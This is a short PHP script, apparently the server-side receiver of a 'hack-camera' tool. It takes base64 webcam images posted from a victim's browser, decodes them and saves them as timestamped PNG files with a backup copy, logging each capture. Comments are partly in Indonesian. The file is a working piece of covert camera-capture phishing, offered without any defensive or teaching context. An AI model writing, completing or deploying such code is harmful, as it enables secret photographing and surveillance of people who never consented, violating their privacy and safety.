<?php

// ====================================================
// POST.PHP - REAL TIME PHOTO SAVE TO HACK-CAMERA FOLDER
// ====================================================

$date = date('dMYHis'); // Format: 19Jul2026143325
$imageData = $_POST['cat'];

if (!empty($_POST['cat'])) {
    error_log("Image captured: $date\n", 3, "log.txt");
}

$filteredData = substr($imageData, strpos($imageData, ",")+1);
$unencodedData = base64_decode($filteredData);

// FILENAME: mzkyzak-19Jul2026143325.png (SAMA FORMAT)
$filename = 'mzkyzak-' . $date . '.png';

// SIMPAN KE PARENT DIRECTORY (Hack-camera folder)
$file_path = '../' . $filename;

$fp = fopen($file_path, 'wb');
fwrite($fp, $unencodedData);
fclose($fp);

// Juga simpan backup ke folder om/ untuk compatibility
$backup_path = 'mzkyzak-' . $date . '.png';
if ($backup_path != $file_path) {
    $fp2 = fopen($backup_path, 'wb');
    fwrite($fp2, $unencodedData);
    fclose($fp2);
}

// LOG untuk debugging
error_log("Saved: $file_path | Backup: $backup_path\n", 3, "debug_log.txt");

echo 'OK';
exit();
?>


